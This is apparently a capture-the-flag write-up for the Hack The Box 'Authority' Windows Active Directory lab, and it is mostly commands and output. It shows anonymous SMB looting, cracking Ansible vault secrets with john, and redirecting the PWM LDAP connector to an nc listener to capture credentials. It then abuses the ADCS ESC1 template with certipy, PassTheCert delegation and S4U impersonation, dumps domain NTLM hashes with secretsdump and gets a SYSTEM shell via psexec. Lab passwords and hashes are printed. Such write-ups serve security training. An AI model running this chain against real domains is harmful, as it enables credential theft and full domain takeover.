## Authority

### Lab Details 

- Difficulty: Medium
- Type: Ansible, PWM, ADCS, Active Directory, Windows

#### Enumeration
- run `nmap`
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-09 19:12:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-10-09T19:13:23+00:00; +4h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-09T19:13:23+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-10-09T19:13:23+00:00; +4h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-09T19:13:23+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-10-07T19:05:43
|_Not valid after:  2027-10-10T06:44:07
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Thu, 09 Oct 2025 19:12:17 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Thu, 09 Oct 2025 19:12:17 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Thu, 09 Oct 2025 19:12:23 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
```
- visit the port 8443 we see the application `PWM`
- search online `PWM (Password Manager) is an open-source password manager, often used in a corporate environment to allow users to manage their own passwords for services like Active Directory or LDAP.`

![[PWM.png]]
- it has a sign in page 
![[PWM login.png]]
- enumerate further with SMB
```bash
$ smbclient -L //10.129.202.251 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.202.251 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- use `nxc` we see that as anonymous we have read access to `Development` share
```bash
$ nxc smb 10.129.235.212 -u "a" -p "" --shares
SMB         10.129.235.212  445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.129.235.212  445    AUTHORITY        [+] authority.htb\a: 
SMB         10.129.235.212  445    AUTHORITY        [*] Enumerated shares
SMB         10.129.235.212  445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.235.212  445    AUTHORITY        -----           -----------     ------
SMB         10.129.235.212  445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.235.212  445    AUTHORITY        C$                              Default share
SMB         10.129.235.212  445    AUTHORITY        Department Shares                 
SMB         10.129.235.212  445    AUTHORITY        Development     READ            
SMB         10.129.235.212  445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.235.212  445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.129.235.212  445    AUTHORITY        SYSVOL                          Logon server share
```
#### Initial Foothold 
- we can download from remote 
```bash
$ smbclient //10.129.235.212/Development
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
- investigate the files and we found a `yml` file containing some hashes
```bash
$ cat ~/smb/Automation/Ansible/PWM/defaults/main.yml 
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531
## need to convert from above to below, adding ; and have hash type and hash on two lines
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
          

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

- need to convert the original hash by removing white spaces and have hash type and hash on separate two lines
```bash
## original value 
pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531
## need to convert from above to below, adding ; and have hash type and hash on two lines
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
```
- and we need to do it for all three hashes and convert them to crackable format using `ansible2john`
```bash
$ ansible2john pwm_admin_login.vault > pwm_admin_login.hash  
$ ansible2john pwm_admin_password.vault > pwm_admin_password.hash
$ ansible2john ldap_admin_password.vault > ldap_admin_password.hash 
```
- and then we can proceed with the decryption using `john`
```bash
$ ls hashes 
ldap_admin_password.hash  pwm_admin_login.hash  pwm_admin_password.hash
```
- we get the plaintext 
```bash
john ./hashes/[hash files] /usr/share/wordlists/rockyou.txt
<SNIP>
!@#$%^&*         (pwm_admin_login.vault)     
!@#$%^&*         (pwm_admin_password.vault)     
!@#$%^&*         (ldap_admin_password.vault)                          
```
- we can decrypt the original hash using `ansible-vault` 
```bash
$ pip install ansible-vault
```
- decrypt the hashes
```bash
$ cat ldap_admin_password.vault | ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123                                                                                                                                    $ cat pwm_admin_login.vault | ansible-vault decrypt 
Vault password: 
Decryption successful
svc_pwm                                                                                                                                        $ cat pwm_admin_password.vault | ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23  
```
- log into the `config editor` with `PWM` admin password
![[PWM editor.png]]
- we can change the `LDAP URL` to point back to our local listener and get the password from the `LDAP` connector
```bash
$ nc -lvnp 389  
listening on [any] 389 ...
connect to [10.10.16.56] from (UNKNOWN) [10.129.175.57] 64242
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!0P  
```
- we can use `svc_ldap` to remote into the target using `evil-winrm`
#### Lateral Movement (If any)

#### Privilege Escalation
- use `certipy` to scan the target in search of vulnerabilities or misconfigurations  
```bash
$ certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.175.57 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : 
<SNIP>
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```
- found its has `ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication` misconfiguration 
- allows all domain computers to enroll which allows enrollee to supply an arbitrary Subject Alternate Name
- verify machine account quota
```bash
$ nxc ldap 10.129.175.57 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
SMB         10.129.175.57   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.175.57   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.129.175.57   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.175.57   389    AUTHORITY        MachineAccountQuota: 10
```
- add computer account
```bash
 impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name 'ATK01' -computer-pass 'Password123!' -dc-ip 10.129.175.57
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Successfully added machine account ATK01$ with password Password123!.
```
- request a certificate as Administrator 
```bash
$ certipy req -username ATK01$ -password 'Password123!' -ca AUTHORITY-CA -dc-ip 10.129.235.212 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.175.57[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.175.57[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```
- if we get error `"KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)" when authenticating over`, `Kerberos` that means that the DC might not support `PKINIT`
- we can use [`PassTheCert`](https://github.com/AlmondOffSec/PassTheCert)
```bash
git clone https://github.com/AlmondOffSec/PassTheCert.git
```
- convert `.pfx` to `.key` 
```bash
openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key
Enter Import Password: ## empty password
Enter PEM pass phrase:1234
Verifying - Enter PEM pass phrase
```
- convert `.pfx` to `.crt`
```bash
openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out administrator.crt
Enter Import Password:
```
- use `passthecert` to add `DCSync` privilege to the computer account
```bash
$ python3 passthecert.py -dc-ip 10.129.235.212 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'ATK01$'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Enter PEM pass phrase:
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATK01$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATK01$       (S-1-5-21-622327497-3269355298-2248959698-12101)
```
- get `Kerberos` service ticket
```bash
$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/ATK01$:Password123!'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
- dump `dc ntlm`
```bash
$ export KRB5CCNAME=Administrator.ccache; impacket-secretsdump -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:cd78929246b8083a8608c64183d40100:::
ATK01$:12101:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Cleaning up... 
```
- authenticate to target as admin using `psexec`
```bash
$ impacket-psexec 'Administrator@10.129.235.212' -hashes aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.235.212.....
[*] Found writable share ADMIN$
[*] Uploading file nAsRnnRg.exe
[*] Opening SVCManager on 10.129.235.212.....
[*] Creating service MWFK on 10.129.235.212.....
[*] Starting service MWFK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
#### Resources

#### Lesson Learned
